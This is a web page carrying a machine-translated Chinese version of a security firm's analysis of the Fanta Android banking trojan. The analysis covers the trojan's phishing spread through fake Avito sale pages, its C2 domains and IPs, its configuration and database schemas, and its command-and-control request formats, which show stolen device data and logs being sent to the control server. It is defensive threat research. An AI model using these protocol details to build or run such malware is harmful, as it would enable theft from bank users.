<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🛠️ 💨 🐜 芬达·蕾丝亚：旧Android木马的新策略 🧘🏻 🏳️ 🕴🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="一旦您想在Avito上出售产品，并且对产品进行了详细描述（例如，RAM模块），您将收到以下消息： 

 当您打开链接时，您会看到一个无害的页面，该页面通知您（成功快乐的卖家）购买了以下商品： 


 单击“继续”按钮后，带有图标和可信名称的APK文件将下载到您的Android设备。 您安装了一个由于...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>芬达·蕾丝亚：旧Android木马的新策略</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/group-ib/blog/466973/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/os/pm/sc/ospmscodjcc8z-smmldzb4zg0au.png"></div><br><br> 一旦您想在Avito上出售产品，并且对产品进行了详细描述（例如，RAM模块），您将收到以下消息： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/dz/kf/nu/dzkfnuomxb5fypqxkisnojt4kto.png"></div><a name="habracut"></a> 当您打开链接时，您会看到一个无害的页面，该页面通知您（成功快乐的卖家）购买了以下商品： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/4x/xp/tn/4xxptnvo0kwvdmeuzrzfbef0fee.png"></div><br> 单击“继续”按钮后，带有图标和可信名称的APK文件将下载到您的Android设备。 您安装了一个由于某种原因要求AccessibilityService权限的应用程序，然后出现了几个窗口并迅速消失，然后就...。 <br><br> 您是来检查余额的，但是由于某种原因，您的银行应用程序再次要求您提供卡的详细信息。 输入数据后，发生了一件可怕的事情：由于您尚不清楚的某些原因，这笔钱开始从您的帐户中消失。 您正在尝试解决问题，但是您的手机仍在抵抗：它按下了“返回”和“主页”键，无法关闭，并且不允许激活任何保护措施。 结果，您一无所有，您的商品没有被购买，您感到困惑，并想知道：发生了什么事？ <br><br> 答案很简单：您是Flexnet系列Android Trojan Fanta的受害者。 怎么发生的？ 我们现在将解释。 <br><br> 作者： <b>Andrey Polovinkin</b> ，恶意代码分析专家， <b>Ivan Pisarev</b> ，恶意代码分析专家。 <br><br><h2> 一些统计 </h2><br>  Flexnet Android Trojan家族于2015年首次广为人知。 在相当长的一段时间内，该家族扩展到几个亚种：Fanta，Limebot，Lipton等。 该木马以及与之相关的基础设施并没有停滞不前：正在开发新的有效分发方案-在我们的案例中，针对特定用户销售商的高质量网络钓鱼页面，并且该木马的开发人员遵循病毒编写的流行趋势-添加了可以更有效地进行窃取的新功能从受感染的设备和旁路保护机制中获得收益 <br><br> 本文所述的活动针对的是俄罗斯用户，在乌克兰检测到少量受感染的设备，在哈萨克斯坦和白俄罗斯则更少。 <br><br> 尽管Flexnet在Android Trojans领域已有4年以上的历史，并且已被许多研究人员进行了详细研究，但它仍然处于良好状态。 从2019年1月开始，潜在的损坏金额超过3500万卢布-这仅适用于俄罗斯境内的战役。 在2015年，该Android木马的各种版本在地下论坛上出售，还可以找到该木马的源代码及其详细说明。 这意味着全世界的破坏统计数据甚至更加令人印象深刻。 这样一个老人的好指标，对吗？ <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/pn/mu/ia/pnmuiawmuc7n_7xrixlsq8krpja.png"></div><br><h2> 从销售到作弊 </h2><br> 正如您从Internet钓鱼页面的屏幕截图中看到的那样，该页面用于放置先前展示的Avito广告，它是为特定受害者准备的。 显然，攻击者使用了Avito解析器之一，提取了电话号码和卖家名称以及产品说明。 页面扩展并准备好APK文件后，会向受害者发送一条SMS消息，其中包含其姓名和指向网络钓鱼页面的链接，其中包含对该产品的描述以及从该产品的“销售”中获得的金额。 通过单击按钮，用户会收到恶意的APK文件-Fanta。 <br><br> 对shcet491 [。] Ru域的检查表明，它被委托给Hostinger的DNS服务器： <br><br><ul><li>  ns1.hostinger.ru </li><li>  ns2.hostinger.ru </li><li>  ns3.hostinger.ru </li><li>  ns4.hostinger.ru </li></ul><br> 域区域文件包含指向IP地址31.220.23 [。] 236、31.220.23 [。] 243和31.220.23 [。] 235的条目。 但是，域主资源记录（A记录）指向IP地址为178.132.1 [。] 240的服务器。 <br><br>  IP地址178.132.1 [。] 240位于荷兰，属于WorldStream <b>主机</b> 。  IP地址31.220.23 [。] 235、31.220.23 [。] 236和31.220.23 [。] 243位于英国，并且属于共享主机服务器HOSTINGER。  <b>Openprov-ru被</b>用作注册商。 以下域也解析为IP地址178.132.1 [。] 240： <br><br><ul><li>  sdelka-ru [。] ru </li><li>  tovar-av [。] ru </li><li>  av-tovar [。] ru </li><li>  ru-sdelka [。] ru </li><li>  shcet382 [。] ru </li><li>  sdelka221 [。] ru </li><li>  sdelka211 [。] ru </li><li>  vyplata437 [。] ru </li><li>  viplata291 [。] ru </li><li>  perevod273 [。] ru </li><li>  perevod901 [。] ru </li></ul><br> 应当指出，几乎所有域都具有以下格式的链接： <br><br>  <b>http：//（www。）{0,1} &lt;％domain％&gt; / [0-9] {7}</b> <br><br> 来自SMS消息的链接也属于此模板。 根据历史数据，根据上述模板，发现一个链接对应于几个链接，这表明使用一个域将特洛伊木马分发给多个受害者。 <br><br> 让我们先行<b>一步</b> ：作为控制服务器，通过SMS链接下载的木马使用<b>onuseseddohap [。] Club</b>地址。 该域于2019-03-12注册，从2019-04-29开始，APK应用与该域进行了交互。 根据从VirusTotal收到的数据，总共109个应用程序与此服务器进行了交互。 域本身解析为IP地址<b>217.23.14 [。] 27</b> ，位于荷兰，由WorldStream <b>托管人</b>拥有。 名称<b>便宜的</b>用作注册商。 域名<b>bad-racoon [。] Club</b> （从2018-09-25开始）和<b>bad-racoon [。] Live</b> （从2018-10-25开始）也解析为该IP地址。 超过80个APK文件与<b>坏浣熊[。] Club</b>域进行了交互，超过100个文件与<b>坏浣熊[。] Live</b>域进行了交互。 <br><br> 一般来说，攻击进度如下： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/dt/ly/ty/dtlytya1dolvfpv8lknlcneu3ri.png"></div><h2> 范塔在引擎盖下有什么？ </h2><br> 像许多其他Android木马一样，Fanta能够读取和发送SMS消息，发出USSD请求，在应用程序（包括银行应用程序）顶部显示自己的窗口。 但是，该家族的功能库已经到来：Fanta开始将<b>AccessibilityService</b>用于不同的目的：从其他应用程序读取通知的内容，防止检测到并阻止特洛伊木马程序在受感染设备上的执行等。  Fanta可在不低于4.4的所有Android版本上使用。 在本文中，我们将仔细研究以下Fanta示例： <br><br><ul><li>  <b>MD5</b> ：0826bd11b2c130c4c8ac137e395ac2d4 </li><li>  <b>SHA1</b> ：ac33d38d486ee4859aa21b9aeba5e6e11404bcc8 </li><li>  <b>SHA256</b> ：df57b7e7ac6913ea5f4daad319e02db1f4a6b243f2ea6500f83060648da6edfb </li></ul><br><h2> 发射后立即 </h2><br> 发射后，木马会立即隐藏其图标。 仅当受感染设备的名称不在列表中时，才可以进行应用程序操作： <br><br><ul><li>  android_x86 </li><li> 虚拟箱 </li><li>  Nexus 5X（牛头） </li><li>  Nexus 5（剃须刀） </li></ul><br> 此检查在Trojan- <b>MainService</b>的主要服务中执行。 首先，应用程序的配置参数将使用默认值（配置数据的存储格式及其值将在后面讨论）以及在管理服务器上注册新的受感染设备进行初始化。  HTTP POST请求将发送到<b>register_bot</b>消息类型和有关受感染设备的信息（Android版本，IMEI，电话号码，操作员姓名和注册操作员的国家/地区代码）到服务器。 服务器的地址为<b>hXXp：// onuseseddohap [。] Club / controller.php</b> 。 作为响应，服务器发送一条消息，其中包含<b>bot_id</b> ， <b>bot_pwd</b>字段- <b>服务器</b> -应用程序将这些值保存为CnC服务器的参数。 如果未收到该字段，则<b>server</b>参数是可选的：Fanta使用注册地址<b>-hXXp：// onuseseddohap [。] Club / controller.php</b> 。 更改CnC地址的功能可用于解决两个问题：在多个服务器之间平均分配负载（具有大量受感染的设备，未优化的Web服务器上的负载可能很高），以及在其中一台CnC服务器发生故障的情况下使用备用服务器。 <br><br> 如果发送请求时发生错误，木马将在20秒后重复注册过程。 <br><br> 成功注册设备后，Fanta将向用户显示以下消息： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/rb/fb/zt/rbfbztfneu8eadin1isjg_ukvxa.png"></div><br> 重要说明：特洛伊木马程序服务的名称为“ <b>系统安全</b> ”，在单击“ <b>确定”</b>按钮后，将打开一个窗口，其中包含受感染设备的“辅助功能”设置，用户必须在其中为恶意服务颁发“辅助功能”权限： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/91/kq/za/91kqzakrb7rkjhcolnvdrge0iws.png"></div><br> 一旦用户打开<b>AccessibilityService</b> ，Fanta就可以访问应用程序窗口的内容以及在其中执行的操作： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gh/cd/ey/ghcdeyjbjlnvmnvvbeukrsssp8i.png"></div><br> 收到访问权限后，特洛伊木马立即要求管理员权限和读取通知的权限： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ow/ob/ht/owobht2xlkanjo_k5ycbvxuamfi.png"></div><br> 应用程序使用AccessibilityService来模拟击键，从而为其自身提供所有必要的权限。 <br><br>  Fanta创建了几个数据库实例（将在后面进行描述），这些实例是保存配置数据以及在此过程中收集的有关受感染设备的信息所必需的。 为了发送收集的信息，木马创建了一个重复任务，该任务旨在从数据库中卸载字段并从控制服务器接收命令。 访问CnC的时间间隔取决于Android版本：在5.1的情况下，时间间隔为10秒，否则为60秒。 <br><br> 为了接收命令，Fanta向管理服务器发出<b>GetTask</b>请求。 作为响应，CnC可以发送以下命令之一： <br><div class="scrollable-table"><table><tbody><tr><th width="100"> 团队 </th><th width="300"> 内容描述 </th></tr><tr><td>  0 </td><td> 发送短信 </td></tr><tr><td>  1个 </td><td> 拨打电话或USSD命令 </td></tr><tr><td>  2 </td><td> 更新<b>时间间隔</b>参数 </td></tr><tr><td>  3 </td><td> 更新<b>拦截</b>参数 </td></tr><tr><td>  6 </td><td> 更新<b>smsManager</b> </td></tr><tr><td>  9 </td><td> 开始收集短信 </td></tr><tr><td>  11 </td><td> 将手机重置为出厂设置 </td></tr><tr><td>  12 </td><td> 启用/禁用对话框创建日志记录 </td></tr></tbody></table></div>  Fanta还从70个银行应用程序，快速付款系统和电子钱包中收集通知，并将它们存储在数据库中。 <br><br><h2> 配置设置存储 </h2><br> 为了存储配置参数，Fanta使用Android平台的标准方法- <b>首选项</b>文件。 设置将保存到名为<b>settings</b>的文件<b>中</b> 。 下表中已保存参数的说明。 <br><div class="scrollable-table"><table><tbody><tr><th width="50"> 名 </th><th width="50"> 预设值 </th><th width="50"> 可能的值 </th><th width="200"> 内容描述 </th></tr><tr><td> 编号 </td><td>  0 </td><td> 整数 </td><td> 机器人编号 </td></tr><tr><td> 伺服器 </td><td>  hXXp：// onuseseddohap [。]俱乐部/ </td><td> 网址 </td><td> 管理服务器地址 </td></tr><tr><td> 密码 </td><td>  -- </td><td> 弦乐 </td><td> 服务器密码 </td></tr><tr><td> 间隔 </td><td>  20 </td><td> 整数 </td><td> 时间间隔。 显示延迟以下任务的时间： <br><ul><li> 发送有关已发送SMS消息状态的请求时 </li><li> 从管理服务器接收新命令 </li></ul><br></td></tr><tr><td> 拦截 </td><td> 全部 </td><td> 全部/电话号码 </td><td> 如果该字段等于字符串<b>all</b>或<b>telNumber</b> ，则接收到的SMS消息将被应用程序拦截，并且不会显示给用户 </td></tr><tr><td> 短信管理器 </td><td>  0 </td><td>  0/1 </td><td> 打开/关闭该应用程序作为默认的SMS收件人 </td></tr><tr><td>  readDialog </td><td> 错误的 </td><td> 对/错 </td><td> 启用/禁用<b>AccessibilityEvent</b>事件记录 </td></tr></tbody></table></div>  Fanta还使用<b>smsManager</b>文件： <br><div class="scrollable-table"><table><tbody><tr><th width="50"> 名 </th><th width="50"> 预设值 </th><th width="50"> 可能的值 </th><th width="200"> 内容描述 </th></tr><tr><td> 公斤 </td><td>  -- </td><td> 弦乐 </td><td> 使用的SMS管理员名称 </td></tr></tbody></table></div><h2> 数据库交互 <br></h2><br> 在工作过程中，该木马使用两个数据库。 名为<b>a</b>的数据库用于存储从手机收集的各种信息。 第二个数据库称为<b>fanta.db</b> ，用于保存负责创建旨在收集有关银行卡信息的网络钓鱼窗口的设置。 <br><br> 该木马使用数据库来存储它收集的信息并记录其操作。 数据存储在<b>日志</b>表中。 要创建表，请使用以下SQL查询： <br><br><pre><code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">create</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">logs</span></span> ( _id <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span> primary <span class="hljs-keyword"><span class="hljs-keyword">key</span></span> autoincrement, d <span class="hljs-built_in"><span class="hljs-built_in">TEXT</span></span>, f <span class="hljs-built_in"><span class="hljs-built_in">TEXT</span></span>, p <span class="hljs-built_in"><span class="hljs-built_in">TEXT</span></span>, m <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>)</code> </pre> <br> 该数据库包含以下信息： <br><br>  1.在<b>打开电话</b>消息的情况下登录包含受感染设备<b>！</b> <br><br>  2.来自应用程序的通知。 该消息是根据以下模板形成的： <br><br><pre> <code class="sql hljs">(&lt;%App Name%&gt;)&lt;%Title%&gt;: &lt;%Notification text%&gt;</code> </pre><br>  3.木马网络钓鱼表格中的银行卡数据。  <b>VIEW_NAME</b>参数可以是列表之一： <br><br><ul><li> 速卖通 </li><li> 阿维托 </li><li> 谷歌播放 </li><li> 其他&lt;％App Name％&gt; </li></ul><br> 该消息以以下格式记录： <br><br><pre> <code class="sql hljs">[&lt;%Time in format HH:mm:ss dd.MM.yyyy%&gt;](&lt;%VIEW_NAME%&gt;)  :&lt;%CARD_NUMBER%&gt;; :&lt;%MONTH%&gt;/&lt;%YEAR%&gt;; CVV: &lt;%CVV%&gt;</code> </pre><br>  4.传入/传出的SMS消息，格式为： <br><br><pre> <code class="sql hljs">([&lt;%Time in format HH:mm:ss dd.MM.yyyy%&gt;] : /) &lt;%Mobile number%&gt;:&lt;%SMS-text%&gt;</code> </pre><br>  5.有关用于创建对话框的软件包的信息，格式为： <br><br><pre> <code class="sql hljs">(&lt;%Package name%&gt;)&lt;%Package information%&gt;</code> </pre><br>  <b>日志表示</b>例： <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/tk/ra/lo/tkraloepxtcsnn6kmnt6fqoxa8e.png"></div><br>  Fanta的功能之一是收集银行卡信息。 数据收集是由于打开银行应用程序时网络钓鱼窗口的创建而发生的。 该木马只创建一个钓鱼窗口。 向用户显示该窗口的信息存储在<b>fanta.db</b>数据库的<b>设置</b>表中。 以下SQL查询用于创建数据库： <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">create</span></span> <span class="hljs-keyword"><span class="hljs-keyword">table</span></span> <span class="hljs-keyword"><span class="hljs-keyword">settings</span></span> (can_login <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, first_bank <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_alpha <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_avito <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_ali <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_vtb24 <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_telecard <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_another <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>, can_card <span class="hljs-built_in"><span class="hljs-built_in">integer</span></span>);</code> </pre> <br> 默认情况下， <b>设置</b>表的所​​有字段都初始化为1（创建网络钓鱼窗口）。 用户输入数据后，该值将设置为0。 <b>设置</b>表的示例字段： <br><br><ul><li>  <b>can_login-</b>该字段负责在打开银行应用程序时显示表单 </li><li>  <b>first_bank-</b>未使用 </li><li>  <b>can_avito-</b>该字段负责在打开Avito应用程序时显示表单 </li><li>  <b>can_ali-</b>该字段负责在打开Aliexpress应用程序时显示表单 </li><li>  <b>can_another-</b>当从列表中打开任何应用程序时，该字段负责显示表单： <b>Yula，Pandao，Drome Auto，Wallet。</b>  <b>折扣和奖励卡，Aviasales，预订，Trivago</b> </li><li>  <b>can_card-</b>该字段负责在打开<b>Google Play</b>时显示表单 </li></ul><br><h2> 管理服务器交互 </h2><br> 通过HTTP与管理服务器进行网络通信。  Fanta使用流行的Retrofit库与网络配合使用。 请求发送到<b>hXXp：// onuseseddohap [。] Club / controller.php</b> 。 在服务器上注册期间可以更改服务器地址。  Cookie可能来自服务器。  Fanta执行以下服务器请求： <br><br><ul><li> 第一次启动时，该机器人会在管理服务器上注册一次。 以下有关受感染设备的数据已发送到服务器： <br>  <b>·</b> <b>Cookies-</b>从服务器收到的Cookie（默认值为空字符串） <br>  <b>·</b> <b>模式</b> -字符串常量<b>register_bot</b> <br>  <b>前缀</b> -整数常量<b>2</b> <br>  <b>·</b> <b>Version_sdk-</b>由以下模式生成： <b>&lt;％Build.MODEL％&gt; / &lt;％Build.VERSION.RELEASE％&gt;（Avit）</b> <br>  <b>Imei-</b>受感染设备的IMEI <br>  <b>·</b> <b>国家（地区）</b> -操作员注册所在<b>国家的</b>代码，采用ISO格式 <br>  <b>·</b> <b>号码</b> -电话号码 <br>  <b>·</b> <b>运算符</b> - <b>运算符</b>名称 <br><br> 发送到服务器的请求示例： <br><br><pre> <code class="sql hljs">POST /controller.php HTTP/1.1 Cookie: Content-Type: application/x-www-form-urlencoded Content-Length: 144 Host: onuseseddohap.club Connection: close Accept-Encoding: gzip, deflate User-Agent: okhttp/3.6.0 mode=register_bot&amp;prefix=2&amp;version_sdk=&lt;%VERSION_SDK%&gt;&amp;imei=&lt;%IMEI%&gt;&amp;country=&lt;%COUNTRY_ISO%&gt;&amp;number=&lt;%TEL_NUMBER%&gt;&amp;operator=&lt;%OPERATOR_NAME%&gt;</code> </pre><br> 为响应该请求，服务器应返回一个包含以下参数的JSON对象： <br>  <b>·Bot_id-</b>被感染设备的标识符。 如果bot_id为0，则Fanta将重新执行该请求。 <br>  <b>·Bot_pwd-</b>服务器的密码。 <br>  <b>·服务器</b> -管理服务器的地址。 可选参数。 如果未指定该参数，则将使用存储在应用程序中的地址。 <br><br>  JSON对象示例： <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>:[ { <span class="hljs-attr"><span class="hljs-attr">"bot_id"</span></span>: &lt;%BOT_ID%&gt;, <span class="hljs-attr"><span class="hljs-attr">"bot_pwd"</span></span>: &lt;%BOT_PWD%&gt;, <span class="hljs-attr"><span class="hljs-attr">"server"</span></span>: &lt;%SERVER%&gt; } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> </li></ul><br><ul><li> 请求从服务器接收命令。 以下数据发送到服务器： <br>  <b>·</b> <b>Cookie-</b>从服务器收到的Cookie <br>  <b>·</b> <b>出价</b> -发送<b>register_bot</b>请求时收到的受感染设备的ID <br>  <b>·</b> <b>Pwd-</b>服务器密码 <br>  <b>·</b> <b>Divice_admin-</b>该字段确定是否已获得管理员权限。 如果获得管理员权限，则该字段为<b>1</b> ，否则为<b>0</b> <br>  <b>·</b> <b>可访问性</b> -可访问性服务的状态。 如果服务已启动，则值为<b>1</b> ，否则为<b>0</b> <br>  <b>·</b> <b>SMSManager-</b>显示木马是否作为接收SMS的默认应用程序打开 <br>  <b>·</b> <b>屏幕</b> -显示<b>屏幕</b>的状态。 如果屏幕打开，它将设置为<b>1</b> ，否则为<b>0</b> ；否则为<b>0</b> 。 <br><br> 发送到服务器的请求示例： <br><br><pre> <code class="json hljs">POST /controller.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Cookie: Content-Type: application/x-www-form-urlencoded Host: onuseseddohap.club Connection: close Accept-Encoding: gzip, deflate User-Agent: okhttp/<span class="hljs-number"><span class="hljs-number">3.6</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> mode=getTask&amp;bid=&lt;%BID%&gt;&amp;pwd=&lt;%PWD%&gt;&amp;divice_admin=&lt;%DEV_ADM%&gt;&amp;Accessibility=&lt;%ACCSBL%&gt;&amp;SMSManager=&lt;%SMSMNG%&gt;&amp;screen=&lt;%SCRN%&gt;</code> </pre> <br> 根据命令，服务器可能返回带有不同参数的JSON对象： <br><br>  <b>·</b>命令“ <b>发送SMS消息”</b> ：参数包含电话号码，SMS消息的文本和要发送的消息的标识符。 在使用<b>setSmsStatus</b>类型的消息发送到服务器时使用该<b>标识符</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-attr"><span class="hljs-attr">"sms_number"</span></span>: &lt;%SMS_NUMBER%&gt;, <span class="hljs-attr"><span class="hljs-attr">"sms_text"</span></span>: &lt;%SMS_TEXT%&gt;, <span class="hljs-attr"><span class="hljs-attr">"sms_id"</span></span>: %SMS_ID% } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b> <b>拨打电话或USSD命令</b> ：电话号码或命令位于响应正文中。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-attr"><span class="hljs-attr">"command"</span></span>: &lt;%TEL_NUMBER%&gt; } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b>命令<b>更改间隔参数</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-attr"><span class="hljs-attr">"interval"</span></span>: &lt;%SECONDS%&gt; } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b>命令<b>更改拦截参数</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-attr"><span class="hljs-attr">"intercept"</span></span>: <span class="hljs-string"><span class="hljs-string">"all"</span></span>/<span class="hljs-string"><span class="hljs-string">"telNumber"</span></span>/&lt;%ANY_STRING%&gt; } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b> <b>更改SmsManager字段命令</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-attr"><span class="hljs-attr">"enable"</span></span>: <span class="hljs-number"><span class="hljs-number">0</span></span>/<span class="hljs-number"><span class="hljs-number">1</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b>命令<b>从受感染的设备收集SMS消息</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">9</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·将</b> <b>电话重置为出厂设置</b>命令： <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">11</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> <br>  <b>·</b>命令<b>更改ReadDialog参数</b> 。 <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"mode"</span></span>: <span class="hljs-number"><span class="hljs-number">12</span></span>, <span class="hljs-attr"><span class="hljs-attr">"enable"</span></span>: <span class="hljs-number"><span class="hljs-number">0</span></span>/<span class="hljs-number"><span class="hljs-number">1</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> </li></ul><br><ul><li> 发送类型为<b>setSmsStatus</b>的消息。 该请求在命令<b>Send SMS</b>之后执行。 请求如下： </li></ul><br><pre> <code class="json hljs">POST /controller.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Cookie: Content-Type: application/x-www-form-urlencoded Host: onuseseddohap.club Connection: close Accept-Encoding: gzip, deflate User-Agent: okhttp/<span class="hljs-number"><span class="hljs-number">3.6</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> mode=setSmsStatus&amp;id=&lt;%ID%&gt;&amp;status_sms=&lt;%PWD%&gt;</code> </pre> <br><ul><li> 提交数据库内容。 对于一个请求，传输一行。 以下数据发送到服务器： <br>  <b>·</b> <b>Cookie-</b>从服务器收到的Cookie <br>  <b>·</b> <b>模式</b> -字符串常量<b>setSaveInboxSms</b> <br>  <b>·</b> <b>出价</b> -发送<b>register_bot</b>请求时收到的受感染设备的ID <br>  <b>·</b> <b>文本</b> -当前数据库记录中的文本（数据库<b>a中</b> <b>日志</b>表中的字段<b>d</b> ） <br>  <b>·</b> <b>Number-</b>当前数据库记录的名称（数据库<b>a</b>中表<b>日志的</b>字段<b>p</b> ） <br>  <b>Sms_mode-</b>整数值（数据库<b>a</b>中表<b>日志的</b>字段<b>m</b> ） <br><br> 请求如下： <br><br><pre> <code class="json hljs">POST /controller.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Cookie: Content-Type: application/x-www-form-urlencoded Host: onuseseddohap.club Connection: close Accept-Encoding: gzip, deflate User-Agent: okhttp/<span class="hljs-number"><span class="hljs-number">3.6</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span> mode=setSaveInboxSms&amp;bid=&lt;%APP_ID%&gt;&amp;text=&lt;%a.logs.d%&gt;&amp;number=&lt;%a.logs.p%&gt;&amp;sms_mode=&lt;%a.logs.m%&gt;</code> </pre> <br> 成功发送到服务器后，该行将从表中删除。 服务器返回的JSON对象的示例： <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"response"</span></span>:[], <span class="hljs-attr"><span class="hljs-attr">"status"</span></span>:<span class="hljs-string"><span class="hljs-string">"ok"</span></span> }</code> </pre> </li></ul><br><h2> 与AccessibilityService的交互 </h2><br> 实施AccessibilityService是为了促进残疾人使用Android设备。 在大多数情况下，需要物理交互才能与应用程序交互。  AccessibilityService允许您以编程方式进行设置。  Fanta使用该服务在银行应用程序中创建假窗口，并阻止打开系统设置和某些应用程序。 <br><br> 通过使用AccessibilityService的功能，该木马可以监视受感染设备屏幕上元素的变化。 如前所述，在Fanta设置中，有一个参数负责使用对话框记录操作<b>-readDialog</b> 。 如果设置了此参数，则有关触发事件的程序包的名称和描述的信息将被添加到数据库中。 触发事件时，该木马执行以下操作： <br><br><ul><li> 在以下情况下模拟回击和归位： <br>  <b>·</b>如果用户要重新启动设备 <br>  <b>·</b>如果用户要删除“ Avito”应用程序或更改访问权限 <br>  <b>·</b>如果页面上提到应用程序“ Avito” <br>  <b>·</b>当您打开应用程序“ Google Play保护”时 <br>  <b>·</b>使用AccessibilityService设置打开页面时 <br>  <b>·</b>当出现“系统安全”对话框时 <br>  